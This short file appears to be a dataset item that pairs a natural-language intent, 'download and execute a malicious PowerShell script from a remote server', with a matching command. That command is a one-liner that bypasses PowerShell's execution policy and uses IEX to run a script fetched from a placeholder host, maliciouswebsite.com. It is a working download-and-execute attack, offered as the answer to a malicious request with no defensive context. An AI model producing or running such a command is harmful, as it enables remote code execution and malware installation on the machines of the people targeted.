# Natural language intent:
# Download and execute a malicious PowerShell script from a remote server.

powershell.exe -nop -ep bypass -c {IEX (New-Object Net.WebClient).DownloadString('http://maliciouswebsite.com/maliciousscript.ps1')}
